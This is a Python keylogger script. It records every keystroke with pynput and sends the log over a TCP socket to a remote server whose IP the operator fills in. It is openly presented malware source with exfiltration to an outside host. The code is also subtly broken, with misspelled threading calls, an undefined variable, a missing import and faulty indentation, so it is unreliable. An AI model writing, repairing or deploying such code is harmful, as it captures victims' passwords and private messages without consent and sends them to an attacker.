import socket
import pynput.keyboard
import threading

class Keylogger:

        def __init__(self, server_ip, server_port):
           
          self.log = ""
          self.server_ip = server_ip
          self.server_port = server_port

        def append_to_log(self, string):
          self.log += string 

        def on_press(self, key):
          try:
             self.append_to_log(key.char)
          except AttributeError:

             if key == key.space: 
                self.append_to_log(" ")
             else:
                self.append_to_log(" " + str(key) + " ") 


        def send_log(self):

          while True:
              if self.log:
                 try:
                   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                   s.connect((self.server_ip, self.server_port))
                   s.send(self.log.encode())
                   self.log = ""
                   s.close()

                  except Exception as e:
                    print(f"Error sending log : {e}")
                    time.sleep(10)
 
        def start(self):
          keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
          while keyboard_listener:
           send_thread = threading.threat(target=self.send_log)
           send_threat.start()
           keyboard_listener.join()


if __name__ == "__main__":
     keylogger = Keylogger("server_ip", 1234)  # server_ip is replaced by actual ip of server
     keylogger.start()
